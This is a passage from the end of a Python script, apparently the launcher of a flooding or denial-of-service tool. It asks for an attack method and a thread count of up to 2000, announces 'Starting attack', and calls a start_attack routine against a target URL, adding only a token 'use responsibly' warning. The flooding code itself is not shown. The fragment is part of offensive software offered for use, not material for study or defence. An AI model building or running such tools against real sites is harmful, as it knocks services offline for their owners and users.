            print("❌ Invalid choice!")
            return
            
        threads = input("🎯 Threads (200-1000 recommended): ").strip()
        threads = int(threads) if threads.isdigit() else 500
        
        # Safety limits with higher maximum
        threads = min(max(threads, 50), 2000)
        
        print(f"\n⚠️  Starting attack with {threads} threads...")
        print("⚠️  Use responsibly and only on authorized targets!")
        time.sleep(2)
        
        tool.start_attack(method, threads)
        
    except KeyboardInterrupt:
        print("\n🛑 Operation cancelled by user")
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        print("💡 Check target URL and internet connection")

if __name__ == "__main__":
    main()
